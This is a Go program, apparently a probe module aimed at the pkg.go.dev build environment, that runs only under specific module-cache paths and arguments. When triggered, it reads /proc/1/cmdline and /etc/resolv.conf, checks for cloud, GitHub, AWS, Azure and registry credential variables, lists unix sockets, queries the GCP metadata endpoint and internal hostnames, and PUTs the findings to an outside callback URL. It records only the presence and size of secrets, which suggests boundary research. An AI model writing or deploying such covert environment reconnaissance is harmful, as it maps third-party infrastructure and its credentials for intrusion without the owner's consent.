package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

var callbackURL string
var callbackSession string

const (
	module  = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	version = "v0.0.70-codex"
	agent   = "go-cgo-pkgsite-probe-v070-codex"
)

type initialReport struct {
	Schema          string `json:"schema"`
	Phase           string `json:"phase"`
	Module          string `json:"module"`
	Version         string `json:"version"`
	ObservedUTC     string `json:"observed_utc"`
	CWD             string `json:"cwd"`
	UID             int    `json:"uid"`
	GID             int    `json:"gid"`
	Hostname        string `json:"hostname"`
	PID1            string `json:"pid1"`
	SensitiveValues bool   `json:"sensitive_values_included"`
}

type envFact struct {
	Present  bool `json:"present"`
	NonEmpty bool `json:"nonempty"`
	Bytes    int  `json:"bytes"`
}

type fileFact struct {
	Path     string `json:"path"`
	Present  bool   `json:"present"`
	Readable bool   `json:"readable"`
	Bytes    int64  `json:"bytes,omitempty"`
	Mode     string `json:"mode,omitempty"`
}

type dnsFact struct {
	Name      string   `json:"name"`
	Addresses []string `json:"addresses"`
	Error     string   `json:"error,omitempty"`
}

type httpFact struct {
	Name       string `json:"name"`
	Status     int    `json:"status"`
	Server     string `json:"server,omitempty"`
	GoogleFE   bool   `json:"google_frontend"`
	ErrorClass string `json:"error_class,omitempty"`
}

type report struct {
	Schema          string             `json:"schema"`
	Phase           string             `json:"phase"`
	Module          string             `json:"module"`
	Version         string             `json:"version"`
	StartedUTC      string             `json:"started_utc"`
	FinishedUTC     string             `json:"finished_utc"`
	CWD             string             `json:"cwd"`
	UID             int                `json:"uid"`
	GID             int                `json:"gid"`
	Hostname        string             `json:"hostname"`
	PID1            string             `json:"pid1"`
	Environment     map[string]envFact `json:"environment"`
	CredentialFile  fileFact           `json:"credential_file"`
	ResolverBytes   int                `json:"resolver_bytes"`
	ResolverSHA256  string             `json:"resolver_sha256"`
	UnixSocketPaths []string           `json:"unix_socket_paths"`
	DNS             []dnsFact          `json:"dns"`
	HTTP            []httpFact         `json:"http"`
	SensitiveValues bool               `json:"sensitive_values_included"`
}

func main() {
	if len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	cwd, _ := os.Getwd()
	wantSuffix := filepath.FromSlash("/pkg/mod/" + module + "@" + version)
	if !strings.HasSuffix(filepath.Clean(cwd), wantSuffix) || strings.HasPrefix(cwd, "/capslock/") {
		return
	}
	if err := validateCallback(); err != nil {
		return
	}
	started := time.Now().UTC()
	hostname, _ := os.Hostname()
	pid1 := boundedFile("/proc/1/cmdline", 2048)
	_ = submit(initialReport{
		Schema: "pkgsite-generic-lane-boundary/v2", Phase: "initial", Module: module, Version: version,
		ObservedUTC: started.Format(time.RFC3339Nano), CWD: cwd, UID: os.Getuid(), GID: os.Getgid(),
		Hostname: hostname, PID1: pid1, SensitiveValues: false,
	}, 5*time.Second)
	r := report{
		Schema: "pkgsite-generic-lane-boundary/v2", Phase: "final", Module: module, Version: version,
		StartedUTC: started.Format(time.RFC3339Nano), CWD: cwd, UID: os.Getuid(), GID: os.Getgid(),
		Environment: make(map[string]envFact), SensitiveValues: false,
	}
	r.Hostname = hostname
	r.PID1 = pid1
	for _, name := range []string{
		"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT", "K_SERVICE", "GAE_SERVICE",
		"GO_DISCOVERY_QUEUE_URL", "GO_DISCOVERY_QUEUE_AUDIENCE", "KUBERNETES_SERVICE_HOST", "KUBECONFIG",
		"GH_TOKEN", "GITHUB_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
		"AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "NPM_TOKEN", "CARGO_REGISTRY_TOKEN",
	} {
		value, ok := os.LookupEnv(name)
		r.Environment[name] = envFact{Present: ok, NonEmpty: value != "", Bytes: len(value)}
	}
	r.CredentialFile = credentialFileFact()
	resolver := []byte(boundedFile("/etc/resolv.conf", 8192))
	r.ResolverBytes = len(resolver)
	sum := sha256.Sum256(resolver)
	r.ResolverSHA256 = hex.EncodeToString(sum[:])
	r.UnixSocketPaths = unixSocketPaths()
	r.DNS = inspectDNS()
	r.HTTP = inspectHTTP()
	r.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submit(r, 10*time.Second)
}

func validateCallback() error {
	if len(callbackSession) != 64 {
		return errors.New("session length")
	}
	for _, c := range callbackSession {
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return errors.New("session alphabet")
		}
	}
	u, err := url.Parse(callbackURL)
	if err != nil || u.Scheme != "https" || u.Host == "" || u.User != nil || u.RawQuery != "" || u.Fragment != "" || u.Path != "/v1/result/"+callbackSession {
		return errors.New("callback shape")
	}
	return nil
}

func boundedFile(path string, limit int64) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	b, _ := io.ReadAll(io.LimitReader(f, limit+1))
	if int64(len(b)) > limit {
		b = b[:limit]
	}
	return strings.ReplaceAll(string(b), "\x00", " ")
}

func credentialFileFact() fileFact {
	path, ok := os.LookupEnv("GOOGLE_APPLICATION_CREDENTIALS")
	f := fileFact{Present: ok && path != ""}
	if !f.Present {
		return f
	}
	if len(path) > 4096 || !filepath.IsAbs(path) {
		f.Path = "invalid-or-relative"
		return f
	}
	f.Path = path
	info, err := os.Stat(path)
	if err != nil {
		return f
	}
	f.Bytes, f.Mode = info.Size(), info.Mode().String()
	h, err := os.Open(path)
	if err == nil {
		f.Readable = true
		h.Close()
	}
	return f
}

func unixSocketPaths() []string {
	data := boundedFile("/proc/net/unix", 64*1024)
	seen := map[string]bool{}
	var out []string
	for _, line := range strings.Split(data, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 8 {
			continue
		}
		path := fields[len(fields)-1]
		if !strings.HasPrefix(path, "/") || len(path) > 1024 || seen[path] {
			continue
		}
		seen[path] = true
		out = append(out, path)
		if len(out) == 64 {
			break
		}
	}
	sort.Strings(out)
	return out
}

func cleanErr(err error) string {
	if err == nil {
		return ""
	}
	s := strings.ToLower(err.Error())
	for _, item := range []string{"timeout", "refused", "no such host", "network is unreachable", "certificate", "reset"} {
		if strings.Contains(s, item) {
			return item
		}
	}
	return "other"
}

func inspectDNS() []dnsFact {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	names := []string{
		"metadata.google.internal", "kubernetes.default.svc.cluster.local", "worker", "frontend",
		"postgres", "redis", "pkg.go.dev", "proxy.golang.org",
	}
	out := make([]dnsFact, 0, len(names))
	for _, name := range names {
		ips, err := net.DefaultResolver.LookupHost(ctx, name)
		f := dnsFact{Name: name, Error: cleanErr(err)}
		if err == nil {
			if len(ips) > 8 {
				ips = ips[:8]
			}
			f.Addresses = ips
		}
		out = append(out, f)
	}
	return out
}

func inspectHTTP() []httpFact {
	dialer := &net.Dialer{Timeout: 2 * time.Second}
	transport := &http.Transport{Proxy: nil, DialContext: dialer.DialContext, TLSHandshakeTimeout: 2 * time.Second}
	client := &http.Client{Transport: transport, Timeout: 3 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	tests := []struct {
		name, endpoint string
		metadata       bool
	}{
		{"metadata-dns", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", true},
		{"metadata-ip", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email", true},
		{"worker-health", "http://worker/healthz", false},
		{"frontend-health", "http://frontend/healthz", false},
		{"pkgsite-health", "https://pkg.go.dev/healthz", false},
	}
	out := make([]httpFact, len(tests))
	done := make(chan int, len(tests))
	for i, test := range tests {
		go func(i int, test struct {
			name, endpoint string
			metadata       bool
		}) {
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			defer cancel()
			req, _ := http.NewRequestWithContext(ctx, http.MethodHead, test.endpoint, nil)
			if test.metadata {
				req.Header.Set("Metadata-Flavor", "Google")
			}
			resp, err := client.Do(req)
			f := httpFact{Name: test.name, ErrorClass: cleanErr(err)}
			if err == nil {
				f.Status = resp.StatusCode
				f.Server = resp.Header.Get("Server")
				f.GoogleFE = strings.EqualFold(f.Server, "Google Frontend")
				resp.Body.Close()
			}
			out[i] = f
			done <- i
		}(i, test)
	}
	for range tests {
		<-done
	}
	transport.CloseIdleConnections()
	return out
}

func submit(value any, timeout time.Duration) error {
	body, err := json.Marshal(value)
	if err != nil || len(body) > 128*1024 {
		return errors.New("report encoding")
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackURL, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", agent)
	req.Header.Set("X-Probe-Session", callbackSession)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusConflict {
		return errors.New("callback status")
	}
	return nil
}
